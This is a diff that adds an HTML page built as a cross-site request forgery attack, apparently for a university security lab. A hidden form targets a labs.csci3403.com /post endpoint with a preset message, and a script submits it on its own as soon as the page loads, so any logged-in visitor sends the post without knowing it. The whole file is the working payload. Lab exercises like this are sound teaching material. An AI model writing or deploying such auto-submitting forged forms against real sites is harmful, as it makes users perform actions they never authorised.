@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <form hidden id="postForm" action="https://5148217.labs.csci3403.com/post" method="POST">
+        <div class="block field has-addons">
+            <div class="control is-expanded">
+                <input name="message" type="text" class="input" value="Manas" maxlength="64">
+            </div>
+            <div class="control">
+                <input type="submit" value="Post" class="button is-info">
+            </div>
+        </div>
+        <div class="notification is-danger is-hidden" id="input_error">Posts cannot be longer than 64 characters.</div>
+    </form>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("postForm").submit();
+        });
+    </script>
+</body>
+</html>
